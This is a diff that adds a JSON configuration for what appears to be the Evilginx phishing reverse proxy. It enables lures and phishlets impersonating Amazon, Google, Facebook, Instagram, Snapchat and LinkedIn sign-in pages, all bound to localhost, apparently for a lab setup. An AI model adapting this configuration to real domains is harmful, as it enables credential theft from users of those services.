@@ -1,0 +1,145 @@
+{
+  "blacklist": {
+    "mode": "noadd"
+  },
+  "general": {
+    "autocert": true,
+    "bind_ipv4": "",
+    "dns_port": 53,
+    "domain": "localhost",
+    "external_ipv4": "127.0.0.1",
+    "https_port": 443,
+    "ipv4": "",
+    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  },
+  "lures": [
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/amz",
+      "paused": 0,
+      "phishlet": "amazon",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/google",
+      "paused": 0,
+      "phishlet": "google",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/fb",
+      "paused": 0,
+      "phishlet": "facebook",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/ig",
+      "paused": 0,
+      "phishlet": "instagram",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/snap",
+      "paused": 0,
+      "phishlet": "snapchat",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    },
+    {
+      "hostname": "",
+      "id": "",
+      "info": "",
+      "og_desc": "",
+      "og_image": "",
+      "og_title": "",
+      "og_url": "",
+      "path": "/linkedin",
+      "paused": 0,
+      "phishlet": "linkedin",
+      "redirect_url": "",
+      "redirector": "",
+      "ua_filter": ""
+    }
+  ],
+  "phishlets": {
+    "amazon": {
+      "hostname": "amz.localhost",
+      "unauth_url": "https://www.amz.localhost/amz",
+      "enabled": true,
+      "visible": true
+    },
+    "facebook": {
+      "hostname": "fb.localhost",
+      "unauth_url": "https://www.fb.localhost/fb",
+      "enabled": true,
+      "visible": true
+    },
+    "google": {
+      "hostname": "google.localhost",
+      "unauth_url": "https://accounts.google.localhost/google",
+      "enabled": true,
+      "visible": true
+    },
+    "instagram": {
+      "hostname": "ig.localhost",
+      "unauth_url": "https://www.ig.localhost/ig",
+      "enabled": true,
+      "visible": true
+    },
+    "linkedin": {
+      "hostname": "linkedin.localhost",
+      "unauth_url": "https://www.linkedin.localhost/linkedin",
+      "enabled": true,
+      "visible": true
+    },
+    "snapchat": {
+      "hostname": "snap.localhost",
+      "unauth_url": "https://accounts.snap.localhost/snap",
+      "enabled": true,
+      "visible": true
+    }
+  }
+}
